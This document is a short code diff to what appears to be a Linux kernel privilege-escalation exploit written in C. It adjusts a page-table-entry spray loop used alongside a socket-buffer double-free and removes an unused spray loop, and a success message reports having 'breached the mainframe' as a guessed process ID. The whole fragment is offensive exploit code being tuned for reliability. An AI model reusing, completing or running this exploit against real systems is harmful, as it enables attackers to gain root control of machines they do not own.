@@ -328,7 +328,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 
 	// spray-allocate the PTEs from PCP allocator order-0 list
 	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
-	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT-2000; i++)
+	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
 		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
 
 	PRINTF_VERBOSE("[*] double-freeing skb...\n");
@@ -479,11 +479,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 					status_cnt = read(status_fd, &buf, 1);
 					if (status_cnt == 0)
 						continue;
-
-					for (unsigned long long i=CONFIG_PTE_SPRAY_AMOUNT; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
-						*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;
-
-
 
 					printf("[+] successfully breached the mainframe as real-PID %u\n", pid_guess);
 
